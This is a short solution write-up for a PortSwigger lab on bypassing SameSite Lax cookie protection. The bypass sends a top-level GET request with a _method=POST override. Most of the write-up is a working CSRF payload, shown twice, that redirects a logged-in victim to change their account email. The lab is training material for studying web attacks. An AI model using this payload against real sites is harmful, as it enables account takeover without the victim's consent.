# Lab: SameSite Lax bypass via method override (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

**Task (from PortSwigger):**  
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.

Credentials: `wiener:peter`  
Use Chrome (victim uses Chrome; Lax default).

## Vulnerability
Session cookie is Lax-by-default. GET top-level navigation sends the cookie. `_method=POST` makes the server treat the request as POST.

## Solution

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

## Final Exploit Payload
```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```
